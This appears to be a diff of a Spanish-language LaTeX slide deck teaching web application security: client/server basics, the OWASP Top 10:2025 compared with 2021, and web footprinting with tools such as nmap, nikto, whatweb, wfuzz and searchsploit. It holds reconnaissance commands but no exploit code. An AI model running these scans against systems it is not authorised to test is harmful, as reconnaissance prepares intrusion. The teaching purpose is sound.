@@ -41,386 +41,331 @@
 
 \begin{frame}{Índice}\scriptsize\tableofcontents\end{frame}
 
+
+\section{Introducción}
+
 \begin{frame}[plain]\begin{center}\includegraphics[width=\textwidth,height=0.92\textheight,keepaspectratio]{img/taxonomia-ataque.pdf}\end{center}\end{frame}
 
-\section{Introducción y fundamentos}
 
 \begin{frame}[allowframebreaks]{Introducción}
 \small
+Aplicaciones web: fundamentos
   \begin{itemize}
-  \item OWASP
-  \item Footprinting web y Burp
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\small
-  \begin{itemize}
-  \item Taxonomía de un Ataque
-  \item Footprinting
-  \item Escaneo /
-  \item Fingerprinting
-  \item Enumeration
-  \item Access
-  \item Elevación Privilegios
-  \item Pivoting / Mov. Lateral
-  \item Covering
-  \item Persistencia/Back doors
-  \item DoS
-  \item Recopilación de Información / Open Source Intelligence
-  \item Credenciales
-  \item Exploiting
-  \item Postexplotación
-  \item Esta unidad nos centramos aquí
-  \item Recopilación de Información / Open Source Intelligence
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Aplicaciones web: fundamentos}
-\small
-  \begin{itemize}
-  \item Arquitectura bien definida
   \item La mayoría de aplicaciones web comparten un esquema similar; sus vulnerabilidades son muy heterogéneas y deben tenerse en cuenta ya en el DISEÑO de la web.
-  \item Atacar para defender
-  \item Saber explotar estas vulnerabilidades es la mejor forma de aprender a defenderse de ellas.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\small
-  \begin{itemize}
+  \item Atacar para defender: Saber explotar estas vulnerabilidades es la mejor forma de aprender a defenderse de ellas.
   \item Existen diferentes tipos de arquitecturas web. Pero el más común es la arquitectura cliente/servidor.
   \item Esta arquitectura involucra uno o más cliente que solicitan recursos a uno o más servidores.
   \item Tanto el servidor como los clientes pueden funcionar en diferentes dispositivos, esto dependerá de la naturaleza de la aplicación.
   \item En el modelo actual pueden aparecer otros elementos. Proxies, cachés, servidores especializados, etc.
   \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl010_1.png}
+\end{frame}
+
+\begin{frame}{Introducción}
+\begin{center}\includegraphics[width=0.9\textwidth,height=0.78\textheight,keepaspectratio]{img/sl010_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{El cliente}
-\small
+\begin{frame}{Introducción}
+\scriptsize
+El cliente
   \begin{itemize}
-  \item Quién inicia la comunicación
+  \item Es quién inicia la comunicación
   \item En la mayoría de aplicaciones el cliente inicia la comunicación con el servidor y necesita un intérprete para interactuar con él.
-  \item Tipos de cliente
-  \item Navegadores web (los más comunes), bots o aplicaciones específicas. El navegador envía las peticiones y el usuario navega entre los distintos niveles de la página.
-  \item Vulnerabilidades Web
+  \item Tipos de cliente: Navegadores web (los más comunes), bots o aplicaciones específicas. El navegador envía las peticiones y el usuario navega entre los distintos niveles de la página.
+  \end{itemize}
+\medskip
+El navegador:
+  \begin{itemize}
+  \item Es el programa capaz de interpretar HTML (entre otras tecnologías) y mostrarlo al usuario final.
+  \item Gestiona su propia caché, almacén de cookies y certificados, y funciones de seguridad básicas. Genera peticiones HTTP para interactuar con el servidor.
   \end{itemize}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{El navegador}
+\begin{frame}[allowframebreaks]{Introducción}
 \small
+El servidor
   \begin{itemize}
-  \item Qué es
-  \item Programa capaz de interpretar HTML (entre otras tecnologías) y mostrarlo al usuario final.
-  \item Qué gestiona
-  \item Su propia caché, almacén de cookies y certificados, y funciones de seguridad básicas. Genera peticiones HTTP para interactuar con el servidor.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{El servidor}
-\small
-  \begin{itemize}
-  \item Su función
   \item Responde a los clientes. Puede servir contenido estático, pero lo habitual hoy es que GENERE contenido dinámico.
-  \item Características
+  \item Características:
+    \begin{itemize}
+
   \item Altas prestaciones y capacidad de atender múltiples conexiones simultáneas.
   \item Desde el punto de vista de la seguridad, es el componente MÁS crítico.
-  \item Vulnerabilidades Web
   \end{itemize}
+    \end{itemize}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{Tecnologías web}
-\small
+\begin{frame}{Introducción}
+\scriptsize
+Tecnologías web:
   \begin{itemize}
-  \item Por qué importan
   \item Identificar qué tecnologías usa la aplicación ---y qué problemas acarrean--- es clave para el análisis de seguridad.
-  \item Cómo categorizarlas
   \item Plataforma de servidor: Apache, Nginx, Tomcat\dots{} Servidor: PHP, Node.js, ASP, Python, Ruby\dots{} Cliente: HTML, JavaScript, TypeScript, Dart\dots{}
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\small
-  \begin{itemize}
   \item Tecnologías Web:
   \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl015_1.png}
+\vspace{0.3em}
+  \begin{center}\includegraphics[width=0.6\textwidth,height=0.52\textheight,keepaspectratio]{img/sl015_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{HTML}
-\small
-  \begin{itemize}
-  \item Qué es
-  \item HyperText Markup Language: lenguaje de marcado que define el CONTENIDO de la página y su orden.
-  \item Qué NO hace
-  \item No define por completo el aspecto ni permite acciones dinámicas. Es fácilmente legible, tiene estructura bien definida y es la unidad mínima de una página web.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
 
-\begin{frame}[allowframebreaks]{Introducción}
-\small
+\begin{frame}{Introducción}
+\scriptsize
+HTML:
+  \begin{itemize}
+  \item HyperText Markup Language: lenguaje de marcado que define el CONTENIDO de la página y su orden.
+  \item No define por completo el aspecto ni permite acciones dinámicas. Es fácilmente legible, tiene estructura bien definida y es la unidad mínima de una página web.
+  \end{itemize}
+\medskip
+CSS:
   \begin{itemize}
   \item CSS permite dotar de estilos nuestra página web, Modificando la apariencia del mismo.
   \item Se emplea el tag \textless{}style\textgreater{}
   \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl017_1.png}
+\vspace{0.3em}
+\begin{center}\includegraphics[width=0.82\textwidth,height=0.34\textheight,keepaspectratio]{img/sl017_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{JavaScript}
-\small
+\begin{frame}{Introducción}
+\scriptsize
+JavaScript
   \begin{itemize}
-  \item Qué aporta
   \item Ejecuta código en el lado CLIENTE $\rightarrow$ funciones complejas imposibles solo con HTML. Permite además consumir APIs para integrar funcionalidades ya existentes.
-  \item Limitaciones (por diseño)
-  \item No puede acceder libremente al contenido del equipo del usuario: está confinado al sandbox del navegador.
-  \item Vulnerabilidades Web
+  \item Limitaciones (por diseño: No puede acceder libremente al contenido del equipo del usuario: está confinado al sandbox del navegador.
   \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl019_1.png}
-\end{center}
-\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl019_2.png}
+\vspace{0.3em}
+\begin{center}\includegraphics[width=0.9\textwidth,height=0.45\textheight,keepaspectratio]{img/sl019_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{Apache}
-\small
+\begin{frame}{Introducción}
+\begin{center}\includegraphics[width=0.9\textwidth,height=0.75\textheight,keepaspectratio]{img/sl019_2.png}
+\end{center}
+\end{frame}
+
+\begin{frame}{Introducción}
+\scriptsize
+Apache:
   \begin{itemize}
-  \item Qué es
   \item Servidor web gratuito y de código abierto para sistemas Unix; en torno al 41,5 \% de cuota global.
-  \item Pros y contras
-  \item Fácil de configurar, estable y muy mantenido. No ofrece el mejor rendimiento en entornos con MUCHAS peticiones concurrentes.
-  \item Vulnerabilidades Web
+  \item Pros y contras: Fácil de configurar, estable y muy mantenido. No ofrece el mejor rendimiento en entornos con MUCHAS peticiones concurrentes.
   \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\small
+\medskip
+PHP:
   \begin{itemize}
   \item PHP es un lenguaje de programación de código abierto muy popular.
   \item PHP puede integrarse dentro del HTML (en el lado del servidor).
   \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl021_1.png}
+\vspace{0.3em}
+\begin{center}\includegraphics[width=0.5\textwidth,height=0.4\textheight,keepaspectratio]{img/sl021_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{Introducción}
-\small
-  \begin{itemize}
-  \item OWASP
-  \item Footprinting web y Burp
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
 
 \section{OWASP Top 10}
 
 \begin{frame}[allowframebreaks]{OWASP Top 10}
 \small
+
+¿Qué es OWASP?
+
   \begin{itemize}
-  \item ¿Qué es OWASP?
-  \item Open Web Application Security Project (OWASP) (https://www.owasp.org) es una organización internacional que, entre otras coas, proporciona las 10 principales vulnerabilidades y fallos en las aplicaciones web. Esta organización actualiza los 10 principales riesgos de seguridad de aplicaciones y, en su última revisión los identifica
-  \item Vulnerabilidades Web
+  \item Open Web Application Security Project (OWASP) (https://www.owasp.org) es una organización internacional que, entre otras cosas, proporciona las 10 principales vulnerabilidades y fallos en las aplicaciones web. Esta organización actualiza periódicamente los 10 principales riesgos de seguridad de aplicaciones.
+  \item La edición vigente es el \textbf{OWASP Top 10:2025} (publicada en noviembre de 2025), que sustituye a la de 2021. Se elabora a partir de datos de más de 2,8 millones de aplicaciones analizadas y de una encuesta a la comunidad, mapeando cada categoría a un conjunto de CWEs.
+  \item Ref: \href{https://owasp.org/Top10/2025/}{https://owasp.org/Top10/2025/}
   \end{itemize}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{OWASP Top 10 --- A1 y A2}
+\begin{frame}[allowframebreaks]{OWASP Top 10}
 \small
   \begin{itemize}
-  \item A1 -- Broken Access Control
-  \item En este caso, lo que se produce es que no se aplican correctamente las restricciones de control de acceso sobre lo que los usuarios autenticados pueden hacer. Los atacantes pueden explotar estas deficiencias para acceder a funciones y / o datos no autorizados, por ejemplo, acceder a las cuentas de otros usuarios, ver archivos confidenciales, modificar datos de otros usuarios, cambiar derechos de acceso, etc.
-  \item A2 -- Fallos en criptografía
-  \item Lo primero es determinar las necesidades de protección de los datos en tránsito y en reposo. Por ejemplo, las contraseñas, los números de tarjetas de crédito, los historiales médicos, la información personal, etc. ¿Se transmiten los datos en texto claro? Esto se refiere a protocolos como HTTP, SMTP, FTP que también utilizan actualizaciones de TLS como STARTTLS. También cuando se utilizan algoritmos o protocolos criptográficos antiguos o débiles o claves criptográficas por defecto, o hay una falta una gestión o rotación de claves adecuada. Cuando no se aplica el cifrado a las directivas o cabeceras de seguridad HTTP. Cuando se ignoran, reutilizan o no se generan vectores de inicialización suficientemente seguros para el modo de funcionamiento criptográfico, etc
-  \item Vulnerabilidades Web
+  \item A01:2025 -- Broken Access Control (Pérdida de control de acceso)
+  \begin{itemize}
+
+  \item En este caso, lo que se produce es que no se aplican correctamente las restricciones de control de acceso sobre lo que los usuarios autenticados pueden hacer. Los atacantes pueden explotar estas deficiencias para acceder a funciones y / o datos no autorizados, por ejemplo, acceder a las cuentas de otros usuarios, ver archivos confidenciales, modificar datos de otros usuarios, cambiar derechos de acceso, etc. En la edición de 2025 esta categoría \textbf{absorbe el SSRF} (Server-Side Request Forgery), que en 2021 era una categoría independiente: forzar a la aplicación a solicitar un recurso remoto sin validar la URL proporcionada por el usuario es, en el fondo, un salto del control de acceso a la red interna.
+    \end{itemize}
+
+  \item A02:2025 -- Security Misconfiguration (Mala configuración de la seguridad)
+  \begin{itemize}
+  \item La configuración incorrecta de la seguridad es uno de los problemas más comunes en las aplicaciones web, que se debe en parte a la configuración manual introducida por el administrador, configuraciones predeterminadas inseguras, repositorios Amazon S3 mal expuestos, encabezados HTTP mal configurados, mensajes de error que contienen información confidencial, sistemas sin parchear o actualizar, y marcos, dependencias y componentes habilitados innecesariamente. Sube del puesto A05 (2021) al A02 (2025).
+  \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{OWASP Top 10}
+\small
+  \begin{itemize}
+  \item A03:2025 -- Software Supply Chain Failures (Fallos en la cadena de suministro software) \textbf{[NUEVA]}
+  \begin{itemize}
+  \item Categoría nueva en 2025, la más votada por la comunidad. Amplía enormemente el alcance de la antigua ``A06:2021 -- Uso de componentes con vulnerabilidades conocidas'': ya no se trata sólo de librerías desactualizadas, sino de cualquier ruptura o compromiso en el proceso de \textbf{construir, distribuir o actualizar} el software. Somos vulnerables si no llevamos un inventario de versiones de dependencias directas y transitivas, si usamos componentes sin mantenimiento o no actualizables, si no hay escaneo de vulnerabilidades ni gestión del cambio, si no existe segregación de funciones (una sola persona puede desplegar código sin supervisión) o si la arquitectura de CI/CD es débil.
+  \item Casos reales: SolarWinds (2019, actualizaciones firmadas troyanizadas que afectaron a unas 18.000 organizaciones), Log4Shell (CVE-2021-44228), el robo de 1.500 millones de dólares a Bybit (2025) vía manipulación del software de wallet, o Shai-Hulud (2025), el primer gusano autopropagable en npm que comprometió más de 500 paquetes atacando directamente las máquinas de los desarrolladores.
+  \end{itemize}
+\end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{OWASP Top 10}
+\small
+  \begin{itemize}
+  \item A04:2025 -- Cryptographic Failures (Fallos en criptografía)
+  \begin{itemize}
+  \item Lo primero es determinar las necesidades de protección de los datos en tránsito y en reposo. Por ejemplo, las contraseñas, los números de tarjetas de crédito, los historiales médicos, la información personal, etc. ¿Se transmiten los datos en texto claro? Esto se refiere a protocolos como HTTP, SMTP, FTP que también utilizan actualizaciones de TLS como STARTTLS. También cuando se utilizan algoritmos o protocolos criptográficos antiguos o débiles o claves criptográficas por defecto, o hay una falta de gestión o rotación de claves adecuada. Cuando no se aplica el cifrado a las directivas o cabeceras de seguridad HTTP. Cuando se ignoran, reutilizan o no se generan vectores de inicialización suficientemente seguros para el modo de funcionamiento criptográfico, etc. Baja del puesto A02 (2021) al A04 (2025).
+\end{itemize}  
+\end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{OWASP Top 10}
+\small
+  \begin{itemize}
+  \item A05:2025 -- Injection (Inyección)
+    \begin{itemize}
+
+  \item Los fallos de inyección, como SQL, inyección de comandos e inyección LDAP se producen cuando se envían datos no confiables a un intérprete como parte de un comando o consulta. Los datos hostiles bien formateados del atacante pueden engañar al intérprete para que ejecute comandos no intencionados o acceda a los datos sin la debida autorización. \textbf{Importante para este tema}: el \emph{Cross-Site Scripting} (XSS) no tiene categoría propia, sino que forma parte de Injection. Baja del puesto A03 (2021) al A05 (2025), reflejando la mejora generalizada en el uso de consultas parametrizadas y frameworks con escapado automático.
+    \end{itemize}
+  \item A06:2025 -- Insecure Design (Diseño inseguro)
+  \begin{itemize}
+
+  \item El diseño inseguro es una categoría amplia que representa diferentes debilidades, expresadas como \textquotedbl{}diseño de control ausente o ineficaz\textquotedbl{}. Hay que distinguir el diseño inseguro de la implementación insegura: tienen distintas causas de origen y distinta remediación. Un diseño seguro puede seguir teniendo defectos de implementación explotables, pero un diseño inseguro no puede arreglarse con una implementación perfecta, ya que, por definición, los controles de seguridad necesarios nunca se crearon para defenderse de ataques específicos. Un factor que contribuye al diseño inseguro es la falta de un perfil de riesgo de negocio del software que se está desarrollando y, por tanto, la incapacidad de determinar qué nivel de diseño de seguridad se requiere.
+  \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[allowframebreaks]{OWASP Top 10}
+\small
+  \begin{itemize}
+  \item A07:2025 -- Authentication Failures (Fallos de autenticación)
+      \begin{itemize}
+
+  \item Renombrada en 2025 (antes ``Identification and Authentication Failures'') para acotar mejor su alcance. Las funciones de la aplicación web relacionadas con la autenticación y la administración de la sesión a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión o, explotar otros fallos de implementación para asumir las identidades de otros usuarios (temporal o permanentemente).
+  \end{itemize}
+
+  \item A08:2025 -- Software or Data Integrity Failures (Fallos de integridad en el software o los datos)
+      \begin{itemize}
+
+  \item Los fallos de integridad del software y de los datos están relacionados con el código y la infraestructura que no protegen contra las violaciones de la integridad. Un ejemplo de esto es cuando una aplicación depende de plugins, bibliotecas o módulos de fuentes, repositorios y redes de entrega de contenido (CDN) no confiables. Muchas aplicaciones incluyen ahora la funcionalidad de auto-actualización, donde las actualizaciones se descargan sin suficiente verificación de la integridad y se aplican a la aplicación previamente confiable. Los atacantes podrían subir sus propias actualizaciones para que se distribuyan y ejecuten en todas las instalaciones. Otro ejemplo es cuando los objetos o datos se codifican o serializan en una estructura que un atacante puede ver y modificar: es la deserialización insegura.
+  \end{itemize}
+  \end{itemize}
+
+\end{frame}
+
+\begin{frame}[allowframebreaks]{OWASP Top 10}
+\small
+  \begin{itemize}
+  \item A09:2025 -- Security Logging \& Alerting Failures (Fallos de registro y alertado)
+  \begin{itemize}
+  \item Renombrada en 2025 (antes ``Logging and Monitoring''), poniendo el énfasis en el \textbf{alertado}: no basta con registrar, hay que detectar y avisar. Debido a un registro de actividades insuficiente, a la ausencia de alertas o a la falta de una respuesta ante incidentes, se permite a los atacantes atacar los sistemas, mantener la persistencia, pivotar a otros sistemas y manipular, extraer o destruir datos. La mayoría de los estudios de infracciones muestran que el tiempo para detectar una infracción es de más de 200 días, y éstas generalmente se han detectado por terceras partes en lugar de por procesos internos.
+    \end{itemize}
+
+  \item A10:2025 -- Mishandling of Exceptional Conditions (Gestión incorrecta de condiciones excepcionales) \textbf{[NUEVA]}
+  \begin{itemize}
+  \item Categoría nueva en 2025 que agrupa 24 CWEs. Cubre los casos en que el programa no previene, no detecta o no responde a situaciones inusuales e imprevisibles, provocando caídas, comportamientos inesperados y vulnerabilidades: validación de entrada deficiente, gestión de errores impropia, manejo inconsistente de excepciones y sistemas que \emph{fallan en abierto} (\emph{fail open}) en lugar de fallar de forma segura.
+  \item Escenarios típicos: (1) una excepción no capturada durante la subida de un fichero deja recursos bloqueados, permitiendo una denegación de servicio por agotamiento de recursos; (2) un error de base de datos que se muestra al usuario revela detalles del sistema y le permite al atacante afinar una inyección SQL (CWE-209); (3) una transacción interrumpida sin \emph{rollback} adecuado deja el estado corrupto --- si el orden era cargar en la cuenta origen, abonar en la destino y registrar la operación, un fallo intermedio habilita el fraude.
+    \end{itemize}
+
   \end{itemize}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{OWASP Top 10 --- A3 y A4}
+\begin{frame}[allowframebreaks]{OWASP Top 10}
 \small
   \begin{itemize}
-  \item A3 -- Inyección
-  \item Los fallos de inyección, como SQL, inyección de comando e inyección LDAP se producen cuando se envían datos no confiables a un intérprete como parte de un comando o consulta. Los datos hostiles bien formateados del atacante pueden engañar al intérprete para que ejecute comandos no intencionados o acceda a los datos sin la debida autorización.
-  \item A4 -- Diseño Inseguro
-  \item El diseño inseguro es una categoría amplia que representa diferentes debilidades, expresadas como \textquotedbl{}diseño de control ausente o ineficaz\textquotedbl{}. Hay una diferencia entre diseño inseguro e implementación insegura. Diferenciamos entre defectos de diseño y defectos de implementación por una razón, tienen diferentes causas de origen y remediación. Un diseño seguro puede seguir teniendo defectos de implementación que den lugar a vulnerabilidades que puedan ser explotadas. Un diseño inseguro no puede arreglarse con una implementación perfecta, ya que, por definición, los controles de seguridad necesarios nunca se crearon para defenderse de ataques específicos. Uno de los factores que contribuyen a un diseño inseguro es la falta de un perfil de riesgo empresarial inherente al software o al sistema que se está desarrollando y, por tanto, la incapacidad de determinar qué nivel de diseño de seguridad se requiere.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{OWASP Top 10 --- A5 y A6}
-\small
-  \begin{itemize}
-  \item A5 - Mala configuración de la seguridad
-  \item La configuración incorrecta de la seguridad es el problema más común en las aplicaciones web, que se debe en parte a la configuración manual introducida por el administrador, configuraciones predeterminadas inseguras, repositorios Amazon S3 (https://docs.aws.amazon.com/es\_es/AmazonS3/latest/dev/UsingBucket.html), encabezados HTTP mal configurados, mensajes de error que contienen información confidencial, sistemas sin parchear o actualizar, marcos, dependencias y componentes identificados de manera absoluta.
-  \item A6 - Uso de componentes con vulnerabilidades conocidas
-  \item Los componentes, externos de las aplicaciones web tales como bibliotecas, marcos, pluggins y otros módulos de software, se ejecutan con los mismos privilegios que la aplicación web y, están desarrollados por terceros que, puede que no hayan tenido en cuenta la seguridad o, incluso, hayan distribuido el paquete software con errores intencionados. Si un ataque explota un componente vulnerable, puede facilitar la toma de control del servidor o el robo de datos.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{OWASP Top 10 --- A7 y A8}
-\small
-  \begin{itemize}
-  \item A7 -- Rotura de autenticación
-  \item Las funciones de la aplicación web relacionadas con la autenticación y la administración de la sesión a menudo se implementan incorrectamente, lo que permite a los atacantes comprometer contraseñas, claves o tokens de sesión o, explotar otros fallos de implementación para asumir las identidades de otros usuarios (temporal o permanentemente).
-  \item A8 -- Fallos de integridad en el software y los datos
-  \item Los fallos de integridad del software y de los datos están relacionados con el código y la infraestructura y, no protegen contra las violaciones de la integridad. Un ejemplo de esto es cuando una aplicación depende de plugins, bibliotecas o módulos de fuentes, repositorios y redes de entrega de contenido (CDN) no confiables. Una cadena de producción CI/CD insegura puede introducir el potencial de acceso no autorizado, código malicioso o compromiso del sistema. Por último, muchas aplicaciones incluyen ahora la funcionalidad de auto-actualización, donde las actualizaciones se descargan sin suficiente verificación de la integridad y se aplican a la aplicación previamente confiable. Los atacantes podrían subir sus propias actualizaciones para que se distribuyan y ejecuten en todas las instalaciones. Otro ejemplo es cuando los objetos o datos se codifican o serializan en una estructura que un atacante puede ver y modificar es vulnerable a la deserialización insegura.
-  \item Vulnerabilidades Web
-  \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{OWASP Top 10 --- A9 y A10}
-\small
-  \begin{itemize}
-  \item A9 - Registro y monitoreo insuficientes
-  \item Debido a un registro de actividades o monitoreo insuficientes, o por la falta de una respuesta ante incidentes, permite a los atacantes atacar los sistemas, mantener la persistencia, pivotar a otros sistemas y manipular, extraer o destruir datos. La mayoría de los estudios de infracciones muestran que el tiempo para detectar una infracción es de más de 200 días, y éstas, generalmente se han detectado por terceras partes en lugar de procesos internos.
-  \item A10 - SSRF
-  \item Los fallos SSRF se producen cuando una aplicación web obtiene un recurso remoto sin validar la URL proporcionada por el usuario. Permite a un atacante coaccionar a la aplicación para que envíe una solicitud manipulada a un destino inesperado, incluso cuando está protegida por un cortafuegos, una VPN u otro tipo de lista de control de acceso a la red (ACL). Además, la gravedad de la SSRF es cada vez mayor debido a los servicios en la nube y a la complejidad de las arquitecturas.
-  \item Vulnerabilidades Web
+  \item \textbf{Se mantienen en su puesto}: A01 Broken Access Control, A07 Authentication Failures (renombrada), A08 Software or Data Integrity Failures, A09 Logging \& Alerting Failures (renombrada).
+  \item \textbf{Cambian de posición}: Security Misconfiguration A05 $\rightarrow$ A02; Cryptographic Failures A02 $\rightarrow$ A04; Injection A03 $\rightarrow$ A05; Insecure Design A04 $\rightarrow$ A06.
+  \item \textbf{Desaparece como categoría propia}: A06:2021 Componentes vulnerables y desactualizados, fusionada y ampliada en la nueva A03:2025 Software Supply Chain Failures.
+  \item \textbf{Desaparece como categoría propia}: A10:2021 SSRF, consolidada dentro de A01:2025 Broken Access Control.
+  \item \textbf{Categorías nuevas}: A03:2025 Software Supply Chain Failures y A10:2025 Mishandling of Exceptional Conditions.
+  \item Aviso: el Top 10 es un documento de \emph{concienciación}, no una lista exhaustiva ni un estándar de certificación. Para verificación se usa el OWASP ASVS.
   \end{itemize}
 \end{frame}
 
 \begin{frame}[allowframebreaks]{OWASP}
 \small
   \begin{itemize}
-  \item Ref: \href{https://owasp.org/www-project-top-ten/}{https://owasp.org/www-project-top-ten/}
-  \item \href{https://systemweakness.com/owasp-top-10-vulnerabilities-latest-2021-cfe44c0d60a7}{Leer}
+  \item Ref: \href{https://owasp.org/Top10/2025/}{https://owasp.org/Top10/2025/} (edición vigente)
+  \item Proyecto: \href{https://owasp.org/www-project-top-ten/}{https://owasp.org/www-project-top-ten/}
+  \item Edición anterior (para comparar): \href{https://owasp.org/Top10/2021/}{https://owasp.org/Top10/2021/}
   \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl029_1.png}
+\centerline{\footnotesize\itshape Nota: los diagramas siguientes corresponden a la edición 2021.}
+\begin{center}\includegraphics[width=\textwidth,height=0.75\textheight,keepaspectratio]{img/sl029_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{OWASP}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl030_1.png}
+\begin{frame}{OWASP}
+\begin{center}\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/sl030_1.png}
 \end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{OWASP}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl031_1.jpg}
+\begin{frame}{OWASP}
+\begin{center}\includegraphics[width=\textwidth,height=0.8\textheight,keepaspectratio]{img/sl031_1.jpg}
 \end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Introducción}
-\small
-  \begin{itemize}
-  \item OWASP
-  \item Footprinting web y Burp
-  \item Vulnerabilidades Web
-  \end{itemize}
 \end{frame}
 
 \section{Footprinting web}
 
 \begin{frame}[allowframebreaks]{Footprinting web}
 \small
+¿Qué es el footprinting? (repaso)
   \begin{itemize}
-  \item ¿Qué es el footprinting?
   \item Antes de estudiar y explotar las vulnerabilidades hay que entender cómo se afronta el análisis PREVIO de una página web.
-  \item Fases de un análisis previo
+  \item Fases de un análisis previo:
+    \begin{itemize}
+
   \item Escaneo de puertos (aunque nos centremos en web, puede haber servicios adicionales).
   \item Escaneo y mapeo de recursos web. Obtención de servicios y versiones. Búsqueda de vulnerabilidades.
-  \item Vulnerabilidades Web
   \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Footprinting --- escaneo de puertos}
-\small
+    \item ¿Por qué escanear puertos primero?
   \begin{itemize}
-  \item ¿Por qué escanear puertos primero?
+
   \item Localizar el servicio web: no siempre corre en el puerto 80.
   \item Localizar servicios auxiliares que usan muchas aplicaciones web.
   \item Detectar un segundo servicio web, quizá menos seguro.
-  \item Herramienta
+  \end{itemize}
+  \item Herramienta:
+  \begin{itemize}
   \item Nmap es una de las herramientas más conocidas de escaneo de redes, puertos y servicios.
   \item nmap -p- -sV \textless{}IP\textgreater{}
-  \item Vulnerabilidades Web
   \end{itemize}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{Footprinting --- servicios y versiones}
-\small
-  \begin{itemize}
-  \item Identificar aplicación y versión
+   \item Identificar aplicación y versión
   \item Localizados los servicios web y auxiliares, conviene saber qué aplicación corre en cada puerto y su versión: es vital para entender el esquema de la web y buscar vulnerabilidades típicas.
   \item Nmap a veces obtiene servicio y versión; también hay programas como Nikto.
   \item nikto -h \textless{}IP\textgreater{}
-  \item Vulnerabilidades Web
   \end{itemize}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{Footprinting --- tecnologías y CMS}
+
+\begin{frame}[allowframebreaks]{Footprinting web}
 \small
   \begin{itemize}
-  \item Identificar tecnologías
+  \item Identificar tecnologías:
   \item whatweb hace footprinting de toda la app e identifica versiones y tecnologías; también wappalyzer.
-  \item CMS conocidos $\rightarrow$ herramientas
-  \item wpscan / wpseku $\cdot$ joomscan $\cdot$ droopescan
-  \item Escáneres de vulns ($\neq$ footprinting)
-  \item Acunetix $\cdot$ Nessus $\cdot$ OpenVAS.
-  \item Vulnerabilidades Web
+  \item CMS conocidos $\rightarrow$ herramientas: wpscan / wpseku $\cdot$ joomscan $\cdot$ droopescan
+  \item Escáneres de vulns ($\neq$ footprinting): Acunetix $\cdot$ Nessus $\cdot$ OpenVAS.
   \end{itemize}
 \begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl036_1.png}
 \end{center}
-\begin{center}\includegraphics[width=0.9\textwidth,height=0.52\textheight,keepaspectratio]{img/sl036_2.png}
-\end{center}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{Footprinting --- descubrir recursos}
+\begin{frame}[allowframebreaks]{Footprinting web}
 \small
   \begin{itemize}
-  \item Descubrir y listar recursos web
-  \item El objetivo es enumerar los recursos existentes. A veces sirve un crawler; otras hay que usar diccionarios de fuerza bruta de rutas.
-  \item wfuzz $\cdot$ dirbuster $\cdot$ dirb
+  \item Descubrir y listar recursos web. El objetivo es enumerar los recursos existentes. A veces sirve un crawler; otras hay que usar diccionarios de fuerza bruta de rutas: wfuzz $\cdot$ dirbuster $\cdot$ dirb
   \item Buscar vulnerabilidades conocidas
-  \item Con toda la información recogida, buscar vulnerabilidades de los servicios conocidos (cve.mitre.org). Offline:
-  \item searchsploit $\cdot$ metasploit
-  \item Vulnerabilidades Web
+  \item Con toda la información recogida, buscar vulnerabilidades de los servicios conocidos (cve.mitre.org). Offline: searchsploit $\cdot$ metasploit
   \end{itemize}
 \end{frame}
 
 \section{Burp Suite}
 
-\begin{frame}[allowframebreaks]{Proxy web}
+\begin{frame}{Burp Suite}
 \small
